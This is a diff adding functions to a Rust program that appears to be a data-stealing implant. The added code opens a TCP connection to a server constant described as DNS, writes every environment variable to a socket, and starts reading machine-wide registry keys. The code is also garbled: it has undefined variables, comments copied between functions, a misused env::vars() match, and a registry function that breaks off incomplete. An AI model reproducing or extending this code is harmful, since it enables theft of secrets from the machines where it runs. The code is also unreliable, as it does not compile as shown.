@@ -385,3 +385,158 @@ fn get_running_processes() -> Vec<String> {
     // Return the results.
     results
 }
+
+// Establish a DNS connection. Return the connection.
+fn establish_dns_connection() -> Option<TcpStream> {
+    // Create a vector to hold the results.
+    let mut results: Option<TcpStream> = None;
+
+    // Establish a connection to the DNS server.
+    let mut connection = match TcpStream::connect(DNS_SERVER) {
+        Ok(connection) => connection,
+        Err(e) => {
+            println!("Error: {}", e);
+            return results;
+        }
+    };
+
+    // Set the socket to non-blocking.
+    match connection.set_nonblocking(true) {
+        Ok(_) => {
+            println!("Socket set to non-blocking.");
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+            return results;
+        }
+    };
+
+    // Return the connection.
+    results = Some(connection);
+
+    // Return the results.
+    results
+}
+
+// Send a DNS query to the server.
+fn send_dns_query(dns_connection: &mut TcpStream) {
+    // Create a vector to hold the data.
+    let mut data = Vec::new();
+
+    // Write the DNS query.
+    data.extend_from_slice(DNS_QUERY.as_bytes());
+
+    // Write the data to the socket.
+    match dns_connection.write(&data) {
+        Ok(_) => {
+            println!("Data sent.");
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+        }
+    };
+
+    // Close the socket.
+    match dns_connection.shutdown(Shutdown::Both) {
+        Ok(_) => {
+            println!("Socket closed.");
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+        }
+    };
+}
+
+// Receive a DNS response from the server.
+fn receive_dns_response(dns_connection: &mut TcpStream) {
+    // Create a vector to hold the data.
+    let mut data = Vec::new();
+
+    // Read the data from the socket.
+    match dns_connection.read(&mut data) {
+        Ok(_) => {
+            println!("Data received.");
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+        }
+    };
+
+    // Close the socket.
+    match dns_connection.shutdown(Shutdown::Both) {
+        Ok(_) => {
+            println!("Socket closed.");
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+        }
+    };
+}
+
+// Store all environment variables in a vector and write them to the socket.
+fn get_environment_variables() -> Vec<String> {
+    // Create a vector to hold the results.
+    let mut results: Vec<String> = Vec::new();
+
+    // Get the environment variables.
+    match env::vars() {
+        Ok(environment_variables) => {
+            println!("Environment variables: {:?}", environment_variables);
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+            return results;
+        }
+    };
+
+    // Write all environment variables to the socket.
+    for (key, value) in environment_variables {
+        // Create a vector to hold the data.
+        let mut data = Vec::new();
+
+        // Write the key.
+        data.extend_from_slice(key.as_bytes());
+        // Write the value.
+        data.extend_from_slice(value.as_bytes());
+
+        // Write the data to the socket.
+        match socket.write(&data) {
+            Ok(_) => {
+                println!("Data sent.");
+            }
+            Err(e) => {
+                println!("Error: {}", e);
+            }
+        };
+    }
+
+    // Close the socket.
+    match socket.shutdown(Shutdown::Both) {
+        Ok(_) => {
+            println!("Socket closed.");
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+        }
+    };
+
+    // Return the results.
+    results
+}
+
+// Store all environment variables in a vector and write them to the socket.
+fn get_registry_keys() -> Vec<String> {
+    // Create a vector to hold the results.
+    let mut results: Vec<String> = Vec::new();
+
+    // Get the registry keys.
+    match RegistryKey::open_subkey_with_flags(HKEY_LOCAL_MACHINE, REGISTRY_KEY, KEY_READ) {
+        Ok(registry_key) => {
+            println!("Registry key: {:?}", registry_key);
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+            return results;
+        }
+    };
+} 
